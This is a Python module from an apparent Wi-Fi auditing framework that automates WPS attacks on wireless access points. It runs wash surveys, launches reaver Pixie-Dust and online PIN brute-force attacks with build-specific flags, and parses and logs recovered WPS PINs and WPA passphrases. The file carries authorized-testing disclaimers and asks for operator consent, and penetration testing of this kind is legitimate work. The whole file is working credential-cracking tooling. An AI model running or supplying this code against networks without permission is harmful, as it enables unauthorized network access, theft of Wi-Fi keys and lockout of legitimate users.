#!/usr/bin/env python3
"""
WPS brute-force module for Wifi-Audit-Framework.
FOR AUTHORIZED PENETRATION TESTING / AUDITING ONLY — use only on networks
you own or have explicit written permission to test.

Wraps the standard WPS audit workflow:

    wash scan  →  reaver Pixie-Dust (offline-style, fast)  →  reaver online
    PIN brute-force (slow, optional — requires explicit operator consent)

Tools required (install on Kali / Parrot):
    wash / reaver  →  apt install reaver
    pixiewps (optional, speeds up Pixie-Dust)  →  apt install pixiewps

Build differences handled automatically: reaver v1.6.6 (original) has NO `-o`
log flag, bare `-K` pixie flag, `-x` fail-wait and `-5` 5GHz flag; the t6x
fork uses `-K 1`. This module probes `reaver --help` once per session and
builds a compatible command line; output is always teed to the log file by
the framework itself so no reaver-side log flag is needed.

Typical usage from main.py option 8:
    from wps_attack import WPSAttack
    WPSAttack.check_tools()                       # warn if wash/reaver missing
    targets = WPSAttack.wash_scan(iface, 30)      # live WPS survey
    # ...or reuse audit.results rows whose WPS column (index 7) is True...
    atk = WPSAttack(iface_mon=iface, bssid=bssid, channel=ch,
                    pixie_first=True, delay=1, fail_wait=5)
    atk.run()   # blocks until cracked / locked / Ctrl+C; saves to /tmp/wpf_wps_*.log
"""

import re
import shutil
import subprocess
import threading
import time
from pathlib import Path

from ui import UI


class WPSAttack:
    """Reaver-based WPS auditor. One instance = one target AP."""

    WASH_DEFAULT_TIMEOUT = 30
    LOG_DIR = Path("/tmp")

    # reaver prints these on success — parsed live from stdout
    _RE_PIN = re.compile(r"WPS PIN:\s*['\"]?(\d{4,8})['\"]?", re.IGNORECASE)
    _RE_PSK = re.compile(r"WPA PSK:\s*['\"]?(.+?)['\"]?\s*$", re.IGNORECASE)
    _RE_SSID = re.compile(r"AP SSID:\s*['\"]?(.+?)['\"]?\s*$", re.IGNORECASE)
    # 0x03 = registrar NACKed our M2 and restarted — AP refuses the transaction
    _RE_NACK03 = re.compile(r"WPS transaction failed \(code:\s*0x03\)", re.IGNORECASE)
    _RE_PROGRESS = re.compile(r"(received m[3-8]|sending m[4-8]|pixiewps.*success|wps pin:)", re.IGNORECASE)

    def __init__(self, iface_mon: str, bssid: str, channel: int = None,
                 pixie_first: bool = True, delay: int = 1, fail_wait: int = 5,
                 ignore_locks: bool = False, timeout: int = 0):
        self.iface_mon = iface_mon
        self.bssid = bssid.strip().upper()
        self.channel = int(channel) if channel and str(channel).isdigit() else None
        self.pixie_first = pixie_first
        self.delay = max(0, int(delay))
        self.fail_wait = max(0, int(fail_wait))
        self.ignore_locks = ignore_locks
        self.timeout = int(timeout or 0)  # 0 = no overall timeout
        self._procs: list = []
        self._stop = threading.Event()
        self._saw_activity = False  # set when reaver shows real attack progress
        self._nack03 = 0  # consecutive code-0x03 registrar NACKs in current phase
        safe = re.sub(r"[^0-9A-Fa-f]", "", self.bssid)
        self.log_path = self.LOG_DIR / f"wpf_wps_{safe}.log"
        self.pin: str | None = None
        self.psk: str | None = None

    # ------------------------------------------------------------------
    #  Tooling / survey helpers (static — no instance needed)
    # ------------------------------------------------------------------
    @staticmethod
    def check_tools() -> dict:
        """Report wash/reaver/pixiewps availability. Returns {tool: path|None}."""
        found = {t: shutil.which(t) for t in ("wash", "reaver", "pixiewps")}
        if not found["wash"] or not found["reaver"]:
            UI.error("WPS tools missing — install with: sudo apt install reaver")
            if not found["wash"]:
                UI.warn("  'wash' not found (ships with the reaver package).")
            if not found["reaver"]:
                UI.warn("  'reaver' not found.")
        else:
            UI.ok(f"WPS tools ready (wash, reaver){' + pixiewps' if found['pixiewps'] else ' — pixiewps optional, not found'}.")
        return found

    @staticmethod
    def list_wps_from_results(results: list) -> list:
        """Filter option-1 scan rows to WPS-enabled APs (results col 7 is the
        beacon_frame() WPS flag). Returns the matching row subset."""
        return [r for r in (results or []) if len(r) > 7 and r[7] is True]

    _reaver_caps_cache = None

    @classmethod
    def _reaver_caps(cls) -> dict:
        """Probe `reaver --help` once per session; adapt flags to the installed
        build (v1.6.6 original vs t6x fork differ in -o / -K args / -x / -5)."""
        if cls._reaver_caps_cache is not None:
            return cls._reaver_caps_cache
        caps = {"pixie": False, "pixie_arg": False, "fail_wait_x": False,
                "m57_T": False, "ghz5": False, "session": False}
        h = ""
        for args in (["reaver", "--help"], ["reaver", "-h"]):
            try:
                p = subprocess.run(args, capture_output=True, text=True, timeout=10)
                h = (p.stdout or "") + (p.stderr or "")
                if h.strip():
                    break
            except Exception:
                continue
        caps["pixie"] = "--pixie-dust" in h or "pixiedust" in h.lower()
        caps["pixie_arg"] = "--pixie-dust=<" in h or "--pixie-dust=" in h
        caps["fail_wait_x"] = "--fail-wait" in h
        caps["m57_T"] = "--m57-timeout" in h
        caps["ghz5"] = "--5ghz" in h
        caps["session"] = "--session" in h
        cls._reaver_caps_cache = caps
        return caps

    @staticmethod
    def iface_is_monitor(iface_mon: str):
        """True if `iw` affirmatively reports monitor type, False if it
        affirmatively reports another type, None if `iw` is missing/failed."""
        if not shutil.which("iw"):
            return None
        try:
            out = subprocess.check_output(["iw", "dev", iface_mon, "info"],
                                          text=True, stderr=subprocess.STDOUT, timeout=5)
            low = out.lower()
            if "type monitor" in low:
                return True
            if "type " in low:
                return False
            return None
        except Exception:
            return None

    @staticmethod
    def wash_scan(iface_mon: str, timeout: int = WASH_DEFAULT_TIMEOUT) -> list:
        """Run `wash -i <iface> -s` for `timeout` seconds and parse hits.

        Returns [{bssid, channel, rssi, locked, essid}, ...]. Empty on failure.
        Interface must already be in monitor mode (main.py guarantees this).
        """
        if not shutil.which("wash"):
            UI.error("'wash' not found — sudo apt install reaver")
            return []
        UI.info(f"WPS survey on {iface_mon} for {timeout}s (wash) — Ctrl+C to stop early...")
        try:
            proc = subprocess.Popen(
                ["wash", "-i", iface_mon, "-s"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1,
            )
        except Exception as e:
            UI.error(f"Failed to start wash: {e}")
            return []
        hits: dict = {}
        stop_at = time.time() + max(5, timeout)
        try:
            while time.time() < stop_at:
                if proc.poll() is not None:
                    break
                try:
                    import select
                    r, _, _ = select.select([proc.stdout], [], [], 1.0)
                    if not r:
                        continue
                    line = proc.stdout.readline()
                except Exception:
                    line = proc.stdout.readline() if proc.stdout else ""
                if not line:
                    continue
                m = re.match(
                    r"\s*([0-9A-Fa-f:]{17})\s+(\S+)\s+(-?\d+|N/A)\s+([\d.]+|N/A)\s+(Yes|No)\s+(Yes|No)\s*(.*)$",
                    line.rstrip(),
                )
                if m:
                    bssid, ch, rssi, _ver, _wps, locked, essid = m.groups()
                    hits[bssid.upper()] = {
                        "bssid": bssid.upper(),
                        "channel": int(ch) if ch.isdigit() else ch,
                        "rssi": rssi,
                        "locked": locked == "Yes",
                        "essid": (essid or "").strip() or "<Hidden>",
                    }
        except KeyboardInterrupt:
            print()
            UI.info("Wash survey stopped early.")
        finally:
            try:
                proc.terminate()
                proc.wait(timeout=3)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        rows = sorted(hits.values(), key=lambda h: h["bssid"])
        UI.ok(f"Wash found {len(rows)} WPS-enabled AP(s).")
        return rows

    # ------------------------------------------------------------------
    #  Attack
    # ------------------------------------------------------------------
    def _build_reaver_cmd(self, pixie_only: bool) -> list:
        """Build a command line the INSTALLED reaver accepts (see _reaver_caps).
        Never uses `-o`: v1.6.6 has no such flag — output is teed to the log
        file by _watch_output instead."""
        caps = self._reaver_caps()
        cmd = ["reaver", "-i", self.iface_mon, "-b", self.bssid, "-vv",
               "-d", str(self.delay)]
        if caps["fail_wait_x"]:
            cmd += ["-x", str(self.fail_wait)]
        elif caps["m57_T"]:
            cmd += ["-T", str(self.fail_wait)]
        if caps["session"]:
            cmd += ["-s", str(self.log_path.with_suffix(".session"))]
        if self.channel:
            cmd += ["-c", str(self.channel)]
            try:
                if int(self.channel) > 14 and caps["ghz5"]:
                    cmd += ["-5"]  # v1.6.6 needs explicit 5GHz mode
            except Exception:
                pass
        if pixie_only and caps["pixie"]:
            # v1.6.6: bare -K flag | t6x fork: -K 1
            cmd += ["-K", "1"] if caps["pixie_arg"] else ["-K"]
        if self.ignore_locks:
            cmd += ["-L"]  # ignore AP WPS locks — noisy, may lock AP out; authorized use only
        if self.timeout and not pixie_only:
            cmd += ["-t", str(self.timeout)]
        return cmd

    def _watch_output(self, proc, tag: str):
        """Stream ALL reaver output (low volume) so the real error is never
        hidden, tee it to the log file (reaver v1.6.6 has no -o flag),
        highlight attack progress, harvest PIN/PSK on sight."""
        try:
            logf = open(self.log_path, "a", encoding="utf-8", errors="replace")
        except Exception:
            logf = None
        try:
            for line in proc.stdout:
                if self._stop.is_set():
                    break
                line = line.rstrip()
                if not line:
                    continue
                low = line.lower()
                if any(k in low for k in ("wps transaction", "sending eap", "received identity",
                                          "trying pin", "trying ", "pixiewps", "pixie-dust",
                                          "associated with", "switching ", "waiting for beacon")):
                    self._saw_activity = True
                print(f"  {UI.DIM}[reaver:{tag}]{UI.RESET} {line[:300]}")
                if logf:
                    try:
                        logf.write(line + "\n")
                    except Exception:
                        pass
                if self._RE_NACK03.search(line):
                    self._nack03 += 1
                    if self._nack03 == 3:
                        UI.warn("AP keeps NACKing M2 (3× code 0x03): its registrar refuses the "
                                "transaction — usually NOT Pixie-Dust vulnerable (common on Realtek) "
                                "or WPS-locked/rate-limited. More retries rarely help; Ctrl+C to stop, "
                                "then check `wash` Lck column or option 3 assessment, or try another target.")
                elif self._RE_PROGRESS.search(line):
                    self._nack03 = 0
                m = self._RE_PIN.search(line)
                if m:
                    self.pin = m.group(1)
                    UI.ok(f"WPS PIN recovered: {UI.GREEN}{self.pin}{UI.RESET}")
                m = self._RE_PSK.search(line)
                if m:
                    self.psk = m.group(1).strip()
                    UI.ok(f"WPA PSK recovered: {UI.GREEN}{self.psk}{UI.RESET}")
                if self.pin and self.psk:
                    try:
                        proc.terminate()
                    except Exception:
                        pass
                    break
        except Exception:
            pass
        finally:
            try:
                if logf:
                    logf.close()
            except Exception:
                pass

    def _dump_log_tail(self, n: int = 25):
        """Print the last `n` non-empty lines of the framework-teed reaver log."""
        try:
            lines = [l for l in self.log_path.read_text(
                encoding="utf-8", errors="replace").splitlines() if l.strip()]
            tail = lines[-n:]
            if tail:
                UI.info(f"reaver log tail ({self.log_path}):")
                for l in tail:
                    print(f"    {UI.DIM}{l[:300]}{UI.RESET}")
            else:
                UI.warn(f"reaver log is empty: {self.log_path}")
        except Exception as e:
            UI.warn(f"Could not read reaver log {self.log_path}: {e}")

    def run(self) -> dict:
        """Execute Pixie-Dust first (if enabled), then optionally full online
        brute-force. Blocks until cracked / failed / stopped. Returns
        {bssid, pin, psk, log}."""
        UI.section(f"WPS Audit — {self.bssid}")
        UI.warn("Authorized testing ONLY — WPS brute-force is noisy and may "
                "temporarily lock the target AP (denying legitimate WPS joins).")
        UI.info(f"Target : {UI.CYAN}{self.bssid}{UI.RESET}  CH:{self.channel or '?'}  via {self.iface_mon}")
        UI.info(f"Log    : {self.log_path}")

        # Pre-flight: reaver hard-requires a monitor-mode iface. Catch the
        # common "prints usage, exits 1 instantly" case BEFORE launching.
        mon = self.iface_is_monitor(self.iface_mon)
        if mon is False:
            UI.error(f"{self.iface_mon} is NOT in monitor mode — reaver cannot run on it.")
            UI.warn("Remediation: `airmon-ng check kill`, restart the framework so the "
                    "iface is put in monitor mode (option 1 must work first), then retry option 8.")
            UI.info(f"Confirm with: iw dev {self.iface_mon} info   (want: type monitor)")
            return {"bssid": self.bssid, "pin": None, "psk": None,
                    "log": str(self.log_path), "error": "not-monitor"}
        if mon is None:
            UI.warn(f"Could not confirm monitor mode on {self.iface_mon} — trying anyway.")

        phases = []
        if self.pixie_first:
            if self._reaver_caps()["pixie"]:
                phases.append(("pixie", True))
            else:
                UI.warn("Installed reaver has no Pixie-Dust (-K) support — pixie phase skipped.")
        phases.append(("brute", False))
        pixie_attempted = False
        for tag, pixie in phases:
            if self._stop.is_set() or (self.pin and self.psk):
                break
            if not pixie:
                if pixie_attempted and not (self.pin and self.psk):
                    UI.warn("Pixie-Dust ran but did not yield the key. Full online PIN "
                            "brute-force can take HOURS and hammers the AP.")
                else:
                    UI.warn("Pixie-Dust skipped by operator. Full online PIN "
                            "brute-force can take HOURS and hammers the AP.")
                try:
                    go = input(f"{UI.BOLD}  ❯ Start full brute-force? [y/N]: {UI.RESET}").strip().lower()
                except (KeyboardInterrupt, EOFError):
                    print()
                    break
                if go not in ("y", "yes"):
                    UI.info("Skipping brute-force — keeping Pixie-Dust results only.")
                    break
            cmd = self._build_reaver_cmd(pixie_only=pixie)
            UI.info(f"Launching reaver ({tag}): {' '.join(cmd)}")
            self._saw_activity = False
            self._nack03 = 0
            t0 = time.time()
            try:
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                        stderr=subprocess.STDOUT, text=True, bufsize=1)
            except FileNotFoundError:
                UI.error("'reaver' not found — sudo apt install reaver")
                break
            except Exception as e:
                UI.error(f"Failed to start reaver: {e}")
                break
            self._procs.append(proc)
            watcher = threading.Thread(target=self._watch_output, args=(proc, tag), daemon=True)
            watcher.start()
            try:
                while proc.poll() is None and not self._stop.is_set():
                    if self.pin and self.psk:
                        break
                    time.sleep(1)
            except KeyboardInterrupt:
                print()
                UI.info("Stopping reaver (session file kept — resume with same BSSID)...")
                self._stop.set()
                try:
                    proc.terminate()
                    proc.wait(timeout=5)
                except Exception:
                    try:
                        proc.kill()
                    except Exception:
                        pass
            watcher.join(timeout=3)
            rc = proc.poll()
            if pixie:
                pixie_attempted = True
            if self.pin and self.psk:
                break
            ran = self._saw_activity or (time.time() - t0 >= 10)
            self._dump_log_tail(25)
            if not ran:
                UI.error(f"reaver exited almost immediately (exit {rc}) — it never started "
                         f"attacking. This is an interface/driver/argument problem, NOT a failed crack.")
                UI.warn(f"Checklist: `iw dev {self.iface_mon} info` → type monitor; "
                        "`airmon-ng check kill`; `ip link show {self.iface_mon}` UP; "
                        "target on the shown channel and in range; full output above + log tail.")
                break  # brute-force would fail identically — don't hammer the AP
            if tag == "pixie":
                UI.warn(f"Pixie-Dust finished (exit {rc}) without full recovery — see {self.log_path}.")
            else:
                UI.warn(f"reaver finished (exit {rc}) — key not recovered. Check {self.log_path}.")

        if self.pin or self.psk:
            UI.ok(f"WPS audit result → PIN:{UI.GREEN}{self.pin or '?'}{UI.RESET}  "
                  f"PSK:{UI.GREEN}{self.psk or '?'}{UI.RESET}")
        else:
            UI.warn("No key recovered in this session.")
        return {"bssid": self.bssid, "pin": self.pin, "psk": self.psk,
                "log": str(self.log_path)}

    def stop(self):
        self._stop.set()
        for p in self._procs:
            try:
                if p.poll() is None:
                    p.terminate()
            except Exception:
                pass
